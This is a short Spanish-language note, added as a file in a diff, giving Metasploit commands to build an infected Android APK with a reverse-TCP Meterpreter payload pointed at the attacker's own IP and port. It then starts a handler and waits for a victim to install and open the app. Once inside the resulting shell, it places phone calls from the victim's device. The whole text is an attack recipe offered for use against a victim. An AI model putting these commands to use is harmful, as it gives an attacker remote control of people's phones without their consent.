@@ -1,0 +1,39 @@
+Comando para crear la apk infectada:
+
+
+>msfpayload android/meterpreter/reverse_tcp LHOST=mi ip LPORT=UnPuerto R > prueba.apk
+
+
+
+luego...
+
+
+>use exploit/multi/handler
+
+
+>set payload android/meterpreter/reverse_tcp 
+
+
+>set lhost MiIp
+
+y 
+
+por ultimo
+
+
+>run
+
+
+
+luego esperar que la victima instale y abra el apk (la session muere si la persona mata el apk)
+
+luego de ejecutar "shell" una vez dentro de la session meterpreter:
+
+
+
+para hacer una llamada
+
+
+service call phone 2 s16 "Nro de telefono"
+
+
